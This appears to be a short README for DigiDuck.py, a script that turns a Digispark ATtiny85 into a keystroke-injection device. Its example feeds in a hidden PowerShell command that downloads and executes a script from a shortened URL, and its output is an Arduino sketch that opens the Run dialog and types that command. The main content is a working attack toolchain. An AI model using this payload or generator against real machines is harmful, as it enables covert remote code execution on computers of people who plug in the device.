# Digispark ATtiny85 as a Cheap "USB Rubber Ducky"

##Usage
    python DigiDuck.py
    Enter command to execute: [COMMAND]
  
##Example

    python DigiDuck.py
    Enter command to execute: powershell -window hidden IEX (New-Object System.Net.Webclient).DownloadString('https://tinyurl.com/z766ych')
    Attack.ino file created successfully!

##Output

```    
#define KEY_DELETE 76

  void setup() {
  DigiKeyboard.update();
}

void loop() {
  delay(100);
  DigiKeyboard.update();
  delay(100);
  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  delay(100);
  DigiKeyboard.sendKeyStroke(KEY_DELETE);
  delay(50);
  DigiKeyboard.println("powershell /window hidden IEX *New/Object System.Net.Webclient(.DownloadString*-https>&&tinyurl.com&z766ych-(");
  delay(900000);
}
```
